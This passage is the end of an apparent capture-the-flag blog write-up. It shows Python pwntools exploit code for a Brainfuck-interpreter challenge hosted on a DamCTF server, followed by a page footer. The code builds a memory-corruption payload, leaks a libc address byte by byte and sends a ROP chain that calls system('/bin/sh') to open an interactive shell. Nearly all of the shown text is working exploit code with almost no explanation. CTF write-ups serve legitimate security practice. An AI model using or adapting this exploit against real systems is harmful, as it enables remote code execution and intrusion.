style="color:#CB7676"> &#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">FFFF</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">            sp </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> jump_target</span><br><span style="color:#4D9375">        elif</span><span style="color:#DBD7CAEE"> ch </span><span style="color:#CB7676">==</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">]</span><span style="color:#C98A7D77">'</span><span style="color:#666666">:</span><br><span style="color:#4D9375">            if</span><span style="color:#DBD7CAEE"> depth </span><span style="color:#CB7676">==</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">:</span><br><span style="color:#4D9375">                return</span><span style="color:#4C9A91"> 0</span><br><span style="color:#DBD7CAEE">            output</span><span style="color:#5eaab5">[</span><span style="color:#DBD7CAEE">sp</span><span style="color:#5eaab5">]</span><span style="color:#666666"> =</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">output</span><span style="color:#4d9375">[</span><span style="color:#DBD7CAEE">sp</span><span style="color:#4d9375">]</span><span style="color:#CB7676"> &#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">FFFFFF00</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> |</span><span style="color:#4C9A91"> 8</span><br><span style="color:#DBD7CAEE">            output</span><span style="color:#5eaab5">[</span><span style="color:#DBD7CAEE">sp</span><span style="color:#5eaab5">]</span><span style="color:#666666"> =</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">loop_start </span><span style="color:#CB7676">&#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">FFFF</span><span style="color:#4d9375">)</span><span style="color:#CB7676"> </span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">&#x3C;</span><span style="color:#4C9A91"> 16</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> |</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">output</span><span style="color:#4d9375">[</span><span style="color:#DBD7CAEE">sp</span><span style="color:#4d9375">]</span><span style="color:#CB7676"> &#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">FFFF</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">            return</span><span style="color:#DBD7CAEE"> sp </span><span style="color:#CB7676">+</span><span style="color:#4C9A91"> 1</span><br><span style="color:#4D9375">        else</span><span style="color:#666666">:</span><br><span style="color:#4D9375">            return</span><span style="color:#4C9A91"> 0</span><br><br><span style="color:#4D9375">    return</span><span style="color:#4C9A91"> 0</span><span style="color:#4D9375"> if</span><span style="color:#DBD7CAEE"> depth </span><span style="color:#4D9375">else</span><span style="color:#DBD7CAEE"> sp</span><br><span style="color:#758575DD">                #>,[[>],[&#x3C;]>-]-[>]-[&#x3C;.+]++++++++++.</span><br><span style="color:#DBD7CAEE">official_code </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">>,[[>],[&#x3C;]>-]-[>]-[&#x3C;.+]++++++++++.</span><span style="color:#C98A7D77">"</span><br><span style="color:#DBD7CAEE">code </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">>,[[>],[&#x3C;]>-]-[>]-[&#x3C;.+][[->.,+]</span><span style="color:#C98A7D77">'</span><br><br><span style="color:#DBD7CAEE">out </span><span style="color:#666666">=</span><span style="color:#666666"> </span><span style="color:#5eaab5">[</span><span style="color:#4C9A91">0</span><span style="color:#5eaab5">]</span><span style="color:#CB7676"> *</span><span style="color:#B8A965"> len</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">code</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">end </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> translate</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">code</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> out</span><span style="color:#5eaab5">)</span><br><span style="color:#B8A965">print</span><span style="color:#5eaab5">(</span><span style="color:#4d9375">[</span><span style="color:#B8A965">hex</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">x</span><span style="color:#d4976c">)</span><span style="color:#4D9375"> for</span><span style="color:#DBD7CAEE"> x </span><span style="color:#4D9375">in</span><span style="color:#DBD7CAEE"> out</span><span style="color:#4d9375">]</span><span style="color:#5eaab5">)</span><br><br><span style="color:#758575DD"># p = process(['./bf',official_code])</span><br><span style="color:#DBD7CAEE">p </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> remote</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">brain-a-tac.chals.damctf.xyz</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#4C9A91">31337</span><span style="color:#5eaab5">)</span><br><span style="color:#758575DD"># gdb.attach(p,'go')</span><br><span style="color:#758575DD"># >&#x3C; ., +- []</span><br><span style="color:#758575DD"># 12 34 56 78</span><br><span style="color:#DBD7CAEE">pay </span><span style="color:#666666">=</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">'</span><span style="color:#C99076">\xff</span><span style="color:#C98A7D77">'</span><span style="color:#CB7676"> *</span><span style="color:#4C9A91"> 7</span><br><span style="color:#DBD7CAEE">pay </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> p32</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">02020205</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> p32</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">02020201</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> p32</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">02020203</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> p32</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">02020204</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> p32</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">01010106</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> p32</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">ffdd0208</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">pay </span><span style="color:#666666">+=</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">'</span><span style="color:#C99076">\x00</span><span style="color:#C98A7D77">'</span><span style="color:#CB7676">+</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">1</span><span style="color:#C98A7D77">'</span><span style="color:#CB7676">*</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">72</span><span style="color:#CB7676">-</span><span style="color:#4C9A91">6</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> +</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">'</span><span style="color:#C99076">\xff</span><span style="color:#C98A7D77">'</span><br><span style="color:#758575DD"># for x in out:</span><br><span style="color:#758575DD">    # pay+=p32(x)</span><br><span style="color:#4D9375">for</span><span style="color:#DBD7CAEE"> i </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">0</span><span style="color:#666666">,</span><span style="color:#B8A965">len</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">pay</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    s</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">pay</span><span style="color:#4d9375">[</span><span style="color:#DBD7CAEE">i</span><span style="color:#666666">:</span><span style="color:#DBD7CAEE">i</span><span style="color:#CB7676">+</span><span style="color:#4C9A91">1</span><span style="color:#4d9375">]</span><span style="color:#5eaab5">)</span><br><span style="color:#758575DD"># p.interactive()</span><br><span style="color:#DBD7CAEE">s</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">2</span><span style="color:#C98A7D77">'</span><span style="color:#CB7676">*0x</span><span style="color:#4C9A91">25b</span><span style="color:#CB7676">+</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C99076">\x87</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">)</span><br><br><span style="color:#758575DD"># p.interactive()</span><br><span style="color:#758575DD"># s(b'\x00'*0x7e+b'\xff')</span><br><span style="color:#DBD7CAEE">s</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">p64</span><span style="color:#4d9375">(</span><span style="color:#4C9A91">0</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#758575DD"># s(b'\x00'*0x1b0+p32</span><br><span style="color:#758575DD"># (0)+b'\x87')</span><br><span style="color:#758575DD"># p.recvuntil(p64(2))</span><br><span style="color:#758575DD"># pause()</span><br><span style="color:#758575DD"># p.interactive()</span><br><span style="color:#758575DD"># p.close()</span><br><span style="color:#DBD7CAEE">x </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> p</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">'</span><span style="color:#C99076">\xb8</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">s</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">'</span><span style="color:#C99076">\x3c</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">libcbase </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> u8</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">'</span><span style="color:#C99076">\xb8</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">x </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> p</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recv</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">libcbase </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> u8</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">x</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> </span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">&#x3C;</span><span style="color:#4C9A91"> 8</span><br><span style="color:#DBD7CAEE">s</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">p8</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">u8</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">x</span><span style="color:#d4976c">)</span><span style="color:#CB7676">+</span><span style="color:#d4976c">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">90</span><span style="color:#CB7676">-0x</span><span style="color:#4C9A91">a3</span><span style="color:#d4976c">)</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">x </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> p</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recv</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">libcbase </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> u8</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">x</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> </span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">&#x3C;</span><span style="color:#4C9A91"> 16</span><br><span style="color:#DBD7CAEE">s</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">p8</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">u8</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">x</span><span style="color:#d4976c">)</span><span style="color:#CB7676">+</span><span style="color:#d4976c">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">11</span><span style="color:#CB7676">-0x</span><span style="color:#4C9A91">2</span><span style="color:#d4976c">)</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">x </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> p</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recv</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">)</span><br><span style="color:#758575DD"># #11903c</span><br><br><br><span style="color:#DBD7CAEE">libcbase </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> u8</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">x</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> </span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">&#x3C;</span><span style="color:#4C9A91"> 24</span><br><span style="color:#DBD7CAEE">s</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">x</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">x </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> p</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recv</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">libcbase </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> u8</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">x</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> </span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">&#x3C;</span><span style="color:#4C9A91"> 32</span><br><span style="color:#DBD7CAEE">s</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">x</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">x </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> p</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recv</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">libcbase </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> u8</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">x</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> </span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">&#x3C;</span><span style="color:#4C9A91"> 40</span><br><span style="color:#DBD7CAEE">s</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">x</span><span style="color:#CB7676">+</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C99076">\x00\x00</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">libcbase </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> libcbase </span><span style="color:#CB7676">-</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">2a3b8</span><br><span style="color:#DBD7CAEE">rdi </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> libcbase </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">11903c</span><br><span style="color:#DBD7CAEE">binsh </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> libcbase </span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE"> libc</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">search</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">/bin/sh</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">)</span><span style="color:#666666">.</span><span style="color:#B8A965">__next__</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">saddr </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> libcbase </span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE"> libc</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sym</span><span style="color:#5eaab5">[</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">system</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">]</span><br><span style="color:#DBD7CAEE">s</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">p64</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">binsh</span><span style="color:#4d9375">)</span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE">p64</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">rdi</span><span style="color:#CB7676">+</span><span style="color:#4C9A91">1</span><span style="color:#4d9375">)</span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE">p64</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">saddr</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#B8A965">print</span><span style="color:#5eaab5">(</span><span style="color:#B8A965">hex</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">libcbase</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#758575DD"># p.interactive()</span><br><span style="color:#758575DD"># pause()</span><br><span style="color:#DBD7CAEE">s</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">'</span><span style="color:#C99076">\x01</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">p</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">interactive</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><br><span style="color:#758575DD"># >&#x3C; ., +- []</span><br><span style="color:#758575DD"># 12 34 56 78</span><br><span style="color:#758575DD"># >,</span><br><span style="color:#758575DD"># [</span><br><span style="color:#758575DD">#   [>]</span><br><span style="color:#758575DD">#   ,</span><br><span style="color:#758575DD">#   [&#x3C;]</span><br><span style="color:#758575DD">#   >-</span><br><span style="color:#758575DD"># ]</span><br><span style="color:#758575DD"># -</span><br><span style="color:#758575DD"># [>]</span><br><span style="color:#758575DD"># -</span><br><span style="color:#758575DD"># [&#x3C;.+]</span><br><span style="color:#758575DD"># ++++++++++.</span><br></code></pre></div></div></div></div><footer class="footer"><div class="footer-row footer-links"><span class="footer-label">保持联系</span><a href="mailto:xzy1476569428@163.com" class="footer-link"><p><a href="mailto:xzy1476569428@163.com" title="mailto:xzy1476569428@163.com">xzy1476569428@163.com</a></p></a><span aria-hidden="true" class="footer-separator">·</span><a href="/rss.xml" class="footer-link">RSS</a><span aria-hidden="true" class="footer-separator">·</span><a href="https://github.com/LittFlower/my_blog" class="footer-link"><p>GitHub</p></a></div><div class="footer-row footer-meta"><span><p>本站基于
<a href="https://github.com/unvariant/blog">unvariant/blog</a>
改造，除特别说明外内容以 CC BY 4.0 协议共享。</p></span></div></footer></body></html>